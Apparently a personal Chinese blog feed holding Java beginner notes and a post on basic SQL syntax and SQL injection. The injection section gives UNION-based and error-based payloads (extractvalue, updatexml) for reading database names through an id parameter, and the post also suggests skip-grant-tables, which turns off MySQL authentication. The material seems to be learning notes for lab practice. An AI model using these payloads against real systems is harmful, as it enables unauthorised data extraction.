<p>非静态的方法<br>子类重写了父类的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>,</span><br><span class="line"><span class="comment">//重写父类的方法</span></span><br></pre></td></tr></table></figure>
<p>方法名，参数列表相同<br>修饰符范围可以扩大：public&gt;protect&gt;privated<br>抛出异常范围可以被缩小但是不能扩大<br>功能：<br>父类的方法子类不一定需要或者不一定满足<br>Alt+Insert：override；</p>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>一个对象的实例类型是确定的，但是引用类型就是不想确定的了<br>多态是方法的多态，是继承关系，方法需要重写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line"><span class="keyword">final</span></span><br><span class="line"><span class="keyword">private</span></span><br></pre></td></tr></table></figure>
<p>实例化的时候，左边决定方法，右边决定用哪个构造器来进行初始化</p>
<h2 id="引用类型转换"><a href="#引用类型转换" class="headerlink" title="引用类型转换"></a>引用类型转换</h2><p>instanceof 关键字，用于判断两个类之间是否是父子关系。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724429449508-52d04f9c-7a9e-446e-9d9f-4c5d4bf3b3ab.png#averageHue=%231f2124&clientId=u89f44812-b4f1-4&from=paste&height=517&id=u02f7709b&originHeight=776&originWidth=1547&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=86097&status=done&style=none&taskId=ud1feb2e5-4099-4831-a323-bbd1138d4b2&title=&width=1031.3333333333333" alt="image.png"><br>同级或者没有继承关系，就会报错</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Father gcc=<span class="keyword">new</span> <span class="title class_">Ch</span>();</span><br><span class="line">高转低，即父转成子，需要使用强制转换</span><br><span class="line">低转高自动转</span><br><span class="line">父转子</span><br><span class="line">((Ch) gcc).get</span><br><span class="line">子转父</span><br><span class="line">Ch aa=<span class="keyword">new</span> <span class="title class_">Ch</span>();</span><br><span class="line">Father fa=aa;</span><br></pre></td></tr></table></figure>
<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;匿名代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;<span class="comment">//只执行一次</span></span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=============&quot;</span>);</span><br><span class="line">        <span class="type">Main</span> <span class="variable">main2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出顺序：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724435117637-803d8020-2026-4d7f-bc08-e8be8c6730ed.png#averageHue=%2327292d&clientId=u89f44812-b4f1-4&from=paste&height=277&id=u56a4c583&originHeight=415&originWidth=545&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=34126&status=done&style=none&taskId=u2a3830b5-62a3-4de0-a8e9-935b3df33c4&title=&width=363.3333333333333" alt="image.png"><br>匿名方法块可以用来赋予初始值</p>
<h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>abstract修饰符，约束<br>抽象类，抽象方法，抽象类的子类继承后必须重写父类的抽象方法，除非子类也是抽象类<br>不能new抽象类<br>抽象类里面可以有正常的方法，抽象方法只能出现在抽象类里面</p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>只有规范，自己无法写方法，专业的约束，实现约束与实现分离，面向接口编程，本质是契约</p>
<h3 id="interface关键字"><a href="#interface关键字" class="headerlink" title="interface关键字"></a>interface关键字</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724435926880-7ffc981d-c2c8-44d7-bae1-5c865975b6d3.png#averageHue=%23f7f0f0&clientId=u89f44812-b4f1-4&from=paste&height=211&id=uef71e2b7&originHeight=317&originWidth=362&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=66436&status=done&style=none&taskId=uf97e7f2b-8b95-41fb-9ffc-0e414ddad01&title=&width=241.33333333333334" alt="image.png"></p>
<ol>
<li>接口中的所有方法定义都是抽象的public abstract</li>
<li>所有属性默认常量 public static final</li>
<li>接口不能被实例化，没有构造方法</li>
<li>必须要重写接口的方法</li>
<li>接口都需要有实现类，一般会用Impl结尾</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724436603932-ca1d608d-ed26-4de1-be7f-03ebad7e79d8.png#averageHue=%23202226&clientId=u89f44812-b4f1-4&from=paste&height=277&id=u46898e62&originHeight=416&originWidth=692&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=45175&status=done&style=none&taskId=uda0c9296-fe73-4959-82cf-fe2e6231dbf&title=&width=461.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724436559060-df707f27-c1ac-421f-97b2-123a895609f9.png#averageHue=%231f2125&clientId=u89f44812-b4f1-4&from=paste&height=215&id=u8c8e3d3e&originHeight=323&originWidth=853&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=26464&status=done&style=none&taskId=uf925a2b9-9324-4909-ba01-6acd2f5ecff&title=&width=568.6666666666666" alt="image.png"><br>重写后就不会报错了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724436687470-b6a5bbe0-f33d-486d-90e4-53ed9caf4e0e.png#averageHue=%231f2024&clientId=u89f44812-b4f1-4&from=paste&height=507&id=u4340cb43&originHeight=760&originWidth=855&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=76504&status=done&style=none&taskId=u401dc4d3-4b06-43b2-aa02-f7411bce3ab&title=&width=570" alt="image.png"><br>接口可以同时有很多个<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724436876105-c2fa8c10-6e67-487a-bb6a-40296339945d.png#averageHue=%23202126&clientId=u89f44812-b4f1-4&from=paste&height=251&id=u781a43b1&originHeight=377&originWidth=901&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=42416&status=done&style=none&taskId=u59631e39-efaf-4a5c-ad02-41520c3442f&title=&width=600.6666666666666" alt="image.png"></p>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">成员内部类</span><br><span class="line">静态内部类</span><br><span class="line">局部内部类</span><br><span class="line">匿名内部类</span><br></pre></td></tr></table></figure>

<ol>
<li>通过外部类来实例化内部类</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724441025288-3cdd1a00-d933-416e-b1ea-c14fffe707ec.png#averageHue=%23202125&clientId=u89f44812-b4f1-4&from=paste&height=549&id=ub734e096&originHeight=824&originWidth=1538&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=104641&status=done&style=none&taskId=u7f10db5a-07c3-433b-a65c-6c5951f33ab&title=&width=1025.3333333333333" alt="image.png"><br>内部类可以获得外部类的私有属性，类型要一致，静态方法无法获取非静态私有属性<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724441192388-2d3c50d9-de07-42bd-b0b0-d33b185cf519.png#averageHue=%23242629&clientId=u89f44812-b4f1-4&from=paste&height=711&id=u2a94fc24&originHeight=1066&originWidth=2079&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=201763&status=done&style=none&taskId=u54c3b25a-637f-4bcd-af55-2c267cb5674&title=&width=1386" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724441300320-767f5969-74de-4210-855c-0d21d45f3b88.png#averageHue=%231f2024&clientId=u89f44812-b4f1-4&from=paste&height=469&id=u1c945a57&originHeight=703&originWidth=779&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=64677&status=done&style=none&taskId=u79fe2df4-39d6-4d62-8a33-865faf434ac&title=&width=519.3333333333334" alt="image.png"></p>
<ol start="2">
<li><p>一个Java文件里面只能有一个public class大类，但是可以有多个class文件</p>
</li>
<li><p>局部内部类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">out</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>匿名内部类，没有名字初始化类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">A</span>().eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>匿名接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">A</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="异常机制"><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h1><p>Exception<br>检查性异常，运行时异常，错误<br>异常等级：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724443008986-6ca8eaa2-cce9-4a88-af3d-ae902664cb27.png#averageHue=%23cccccc&clientId=u89f44812-b4f1-4&from=paste&height=419&id=uf4a20871&originHeight=628&originWidth=1007&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=149140&status=done&style=none&taskId=u2ccbf0ac-6f27-4f32-8551-9990eb45d42&title=&width=671.3333333333334" alt="image.png"></p>
<h2 id="抛出，捕获，处理"><a href="#抛出，捕获，处理" class="headerlink" title="抛出，捕获，处理"></a>抛出，捕获，处理</h2><p><code>try、catch、finally、throw、throws</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="number">1</span>/<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArithmeticException e)&#123;<span class="comment">//catch（想要捕获的异常类型）</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Arithmetic Exception&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//可以不要，一般用于IO流，资源关闭</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Finally&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也支持写多个catch，只会生效且其中一个，和if，else if一样，但是捕获的异常需要从小到大的写，否则会报错<br>快捷键：选中后Ctrl+Alt+T</p>
<h3 id="主动抛出异常"><a href="#主动抛出异常" class="headerlink" title="主动抛出异常"></a>主动抛出异常</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (b==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一般会在方法里面<br>throws，无法解决，往上抛出</p>
<h2 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724444393540-39f800ba-5a11-4f6d-b25a-6958dc0c1500.png#averageHue=%2324262a&clientId=u89f44812-b4f1-4&from=paste&height=820&id=u600d2446&originHeight=1230&originWidth=2077&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=295484&status=done&style=none&taskId=u6673e225-bef5-4366-a639-eb2d762ff5c&title=&width=1384.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724444412049-d65c0923-9f84-4253-9c51-96a3d94d5d87.png#averageHue=%2324262a&clientId=u89f44812-b4f1-4&from=paste&height=783&id=u863e36bd&originHeight=1175&originWidth=2089&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=261451&status=done&style=none&taskId=uf5ace121-aa5b-43ce-91e0-40c0e79e0cc&title=&width=1392.6666666666667" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> learn.Erro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">text</span><span class="params">(<span class="type">int</span> a)</span> <span class="keyword">throws</span> MyException&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;参数为&quot;</span>+a);</span><br><span class="line">        <span class="keyword">if</span>(a&gt;<span class="number">100</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MyException</span>(a);<span class="comment">//抛出异常</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            text(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MyException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> learn.Erro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        code = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//异常的打印信息</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyException&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;code=&quot;</span> + code +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="JavaDoc生成文档"><a href="#JavaDoc生成文档" class="headerlink" title="JavaDoc生成文档"></a>JavaDoc生成文档</h1><p>cmd生成<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723847418988-00ed2c9e-6445-4ead-8244-6977e2b6beb5.png#averageHue=%23141414&clientId=ue8ddaea2-63de-4&from=paste&height=48&id=AoPAD&originHeight=72&originWidth=776&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36085&status=done&style=none&taskId=ua82bd309-07c6-4154-9bc2-ca7162aaecf&title=&width=517.3333333333334" alt="image.png"><br>idea生成<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723847593274-70897527-e6cc-4f21-8879-58c856baca6c.png#averageHue=%2325272a&clientId=ue8ddaea2-63de-4&from=paste&height=866&id=u7703a6de&originHeight=1299&originWidth=2082&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=162384&status=done&style=none&taskId=u899e320f-c02d-4dfe-aefb-5fc51c5bacd&title=&width=1388" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723847771822-cd5f14f9-7968-4f28-92d9-32cae1e44c06.png#averageHue=%232d3136&clientId=ue8ddaea2-63de-4&from=paste&height=776&id=ub573830b&originHeight=1164&originWidth=754&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=80598&status=done&style=none&taskId=u08f7a4c6-40bc-461e-903f-8060cef949d&title=&width=502.6666666666667" alt="image.png"><br>打开刚刚存储的文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723847839515-6504e0a9-84af-4440-89d4-ae8ea5d98ffd.png#averageHue=%23f9f7f7&clientId=ue8ddaea2-63de-4&from=paste&height=644&id=u0c590593&originHeight=966&originWidth=1691&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=149342&status=done&style=none&taskId=u03f9f9be-ac28-454a-a1b6-2ee74e922f0&title=&width=1127.3333333333333" alt="image.png"><br>能够看到生成了，并且也自动弹出了网页<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723847884570-ee65560a-ed19-41f0-9070-f55de4a903d5.png#averageHue=%23cf9346&clientId=ue8ddaea2-63de-4&from=paste&height=402&id=u5b6d30ab&originHeight=603&originWidth=1088&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=44635&status=done&style=none&taskId=ub25905ec-ccba-4460-96e4-34ecb5a26e0&title=&width=725.3333333333334" alt="image.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还没完，但是我要先总结，IDEA简直就是神器</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>编程语言</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2024/03/31/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>SQL基础命令学习以及一些基本的SQL注入</p>
<span id="more"></span>

<p><a name="Fqj1f"></a></p>
<h1 id="一个搞了一晚上的坑"><a href="#一个搞了一晚上的坑" class="headerlink" title="一个搞了一晚上的坑"></a>一个搞了一晚上的坑</h1><p>使用SQLyog时连接不上出现1045错误,然后按照搜索出来的方法,打开PHP study关闭他的MYSQL在MYSQL文件内找到my.ini打开文件查找到 [mysqld] ，在其下方添加上一行 skip-grant-tables，然后保存。再重启MYSQL即可连接成功<br><a name="rOGYv"></a></p>
<h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>– :注释<br />id&#x3D;1’报错即为字符型注入<br />要找到注入点<br />order by 后面加数字<br />group by + 数字,确定列数</p>
<blockquote>
<p>-1’ union select 1,database()# 前面的-1 空出回显位</p>
</blockquote>
<p><a name="NrwJo"></a></p>
<h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><ul>
<li>information_schema</li>
</ul>
<p><code>SCHEMATA</code>表,当前root中所有数据库的信息,一般用来查到表名<br /><code>TABLES</code>表:记录用户所有数据库名(TABLE_SCHEMA)和表名(TABLE_NAME)<br /><code>columns</code>表:提供表中的列信息<br>:::danger<br>首先确定注入点–&gt;找到回显位置–&gt;<br>:::<br><a name="QegFW"></a></p>
<h1 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h1><p><a name="LfLDf"></a></p>
<h1 id="extractValue报错"><a href="#extractValue报错" class="headerlink" title="extractValue报错"></a>extractValue报错</h1><blockquote>
<p>?id&#x3D;-1’ union select 1,2,extractvalue(1,concat(0x7e,(select database()))),3 –+</p>
</blockquote>
<p>extractValue(列名,’&#x2F;查询内容路径&#x2F;‘)当斜号改成别的符号,就会报错执行回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(doc,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())));</span><br></pre></td></tr></table></figure>
<p>conccat拼接,0x7e是~的编译,extractvalue括号内的内容即为正常查询的内容,但是默认只返回32个字符<br />substring(内容,从哪个字符开始显示,一次显示几个字符)</p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,2,extractvalue(1,concat(0x7e,(select database()))),3 –+</p>
</blockquote>
<p><a name="RDvii"></a></p>
<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p>updatexml(‘XML_document’,’Xpath_string’,’New_value’)<br />&#x2F;&#x2F;即<br />updatexml(‘目标xml文件名’,’在xml中查询的字符串’,’替换后的值’)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)<span class="operator">/</span><span class="operator">/</span><span class="keyword">select</span> 语句需要用括号括起来</span><br></pre></td></tr></table></figure>
<blockquote>
<p>?id&#x3D;1’ and updatexml(1,’~’,3) – a 判断是否为报错注入</p>
</blockquote>
<p><a name="HVH8e"></a></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><a name="OUtke"></a></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul>
<li>information_schema</li>
</ul>
<p><code>SCHEMATA</code>表,当前root中所有数据库的信息,一般用来查到表名<br /><code>TABLES</code>表:记录用户所有数据库名(TABLE_SCHEMA)和表名(TABLE_NAME)<br /><code>columns</code>表:提供表中的列信息<br><a name="L9a4W"></a></p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><a name="mnggm"></a></p>
<h3 id="SELECT-WHERE"><a href="#SELECT-WHERE" class="headerlink" title="SELECT WHERE"></a>SELECT WHERE</h3><p>语法<br />SELECT column_name,column_name（列名称）<br />FROM table_name（表名称）<br />WHERE column_name operator value;字段名称，数据满足什么条件类似if语句<br />（if（。。。。&#x3D;。。<br />printf(…)<br />）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674294315668-0d9b9c0a-e317-45eb-bac5-89871ef6bc93.png#averageHue=%23cdc0a4&clientId=u2f371465-feeb-4&from=paste&height=314&id=u78d7e8b3&originHeight=471&originWidth=1503&originalType=binary&ratio=1&rotation=0&showTitle=false&size=232927&status=done&style=none&taskId=ueda2f8f8-2896-45f3-ac15-a08bd2fdde2&title=&width=1002" alt="image.png"><br><a name="htdLX"></a></p>
<h3 id="CREATE-DEATABASE语句-创建数据库"><a href="#CREATE-DEATABASE语句-创建数据库" class="headerlink" title="CREATE DEATABASE语句,创建数据库"></a>CREATE DEATABASE语句,创建数据库</h3><p> 在 MySQL 中，可以使用 CREATE DATABASE 语句创建数据库，语法格式如下：<br />CREATE DATABASE [IF NOT EXISTS] &lt;数据库名&gt;<br />[[DEFAULT] CHARACTER SET &lt;字符集名&gt;] <br />[[DEFAULT] COLLATE &lt;校对规则名&gt;];<br />[ ]中的内容是可选的。语法说明如下：<br />&lt;数据库名&gt;：创建数据库的名称。MySQL 的数据存储区将以目录方式表示 MySQL 数据库，因此数据库名称必须符合操作系统的文件夹命名规则，不能以数字开头，尽量要有实际意义。注意在 MySQL 中不区分大小写。<br />IF NOT EXISTS：在创建数据库之前进行判断，只有该数据库目前尚不存在时才能执行操作。此选项可以用来避免数据库已经存在而重复创建的错误。<br />[DEFAULT] CHARACTER SET：指定数据库的字符集。指定字符集的目的是为了避免在数据库中存储的数据出现乱码的情况。如果在创建数据库时不指定字符集，那么就使用系统的默认字符集。<br />[DEFAULT] COLLATE：指定字符集的默认校对规则。  <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674804138075-58e5675c-2a2f-41b9-8931-bc60d4b23b9d.png#averageHue=%23fcfcfb&clientId=u2f371465-feeb-4&from=paste&height=575&id=ue5ce2067&originHeight=862&originWidth=1541&originalType=binary&ratio=1&rotation=0&showTitle=false&size=306752&status=done&style=none&taskId=u50c5a863-b049-4715-b227-cc4a2cc9d97&title=&width=1027.3333333333333" alt="image.png"><br />创建完后刷新一下侧边栏才能看到<br><a name="Cy5wM"></a></p>
<h3 id="creat-table-创建表"><a href="#creat-table-创建表" class="headerlink" title="creat table 创建表"></a>creat table 创建表</h3><p> create 表名(<br />列名1  定义字段的数据类型 ， <br />列名2  类型，<br />列名3 类型）<br />一个简单的建表格式，其中：</p>
<ul>
<li>字符串类型（char，varchar）需要指定长度；</li>
<li>整型（int，biging，tinyint等）和日期类型（datetime，timestamp等）只需要指定类型，不需要指定长度；</li>
<li>decimal类型需要指定精度和小数位数。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674806102179-29f5ef6b-cd00-4ab9-9dc3-dd0e736e37da.png#averageHue=%23fcfbfa&clientId=u2f371465-feeb-4&from=paste&height=455&id=uecda8fd9&originHeight=682&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119001&status=done&style=none&taskId=uc6482fe7-a51c-42d3-ac5b-4f84d0481b8&title=&width=852.6666666666666" alt="image.png"><br><a name="UPOvG"></a></p>
<h3 id="数据插入，增"><a href="#数据插入，增" class="headerlink" title="数据插入，增"></a>数据插入，增</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO TABLE_NAME (column1, column2, column3,...columnN)</span><br><span class="line">VALUES (value1, value2, value3,...valueN);</span><br><span class="line">//table_name 表名</span><br><span class="line">colimn 字段名</span><br><span class="line">value 字段数据</span><br></pre></td></tr></table></figure>
<p>写明column就会一一对应，没写就会按照顺序依次赋值<br />注字符要用单引号，否则会报错<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674807157319-c8e1f44c-89da-4ece-a791-2e8ddbda06c6.png#averageHue=%23faf9f8&clientId=u2f371465-feeb-4&from=paste&height=450&id=u935da9de&originHeight=675&originWidth=1387&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115187&status=done&style=none&taskId=u2e990afe-0011-4b1f-a614-e4e963a360d&title=&width=924.6666666666666" alt="image.png"><br />这样就创建成功了使用select*from t1即可查看<br><a name="ypsAF"></a></p>
<h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name//表名</span><br><span class="line">WHERE some_column=some_value;//条件</span><br></pre></td></tr></table></figure>
<p> 用于删除表中的行<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674807923384-c02acfcf-f9b4-4841-badb-16cbd9986efa.png#averageHue=%23dccba9&clientId=u2f371465-feeb-4&from=paste&height=318&id=u5ada8352&originHeight=477&originWidth=689&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89935&status=done&style=none&taskId=udf437a7d-efbf-4319-9915-1775cba1de5&title=&width=459.3333333333333" alt="image.png"><br><a name="klCG4"></a></p>
<h3 id="改，update"><a href="#改，update" class="headerlink" title="改，update"></a>改，update</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1字段名=value1字段数据,column2=value2,...//更改操作</span><br><span class="line">WHERE some_column=some_value;//条件判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
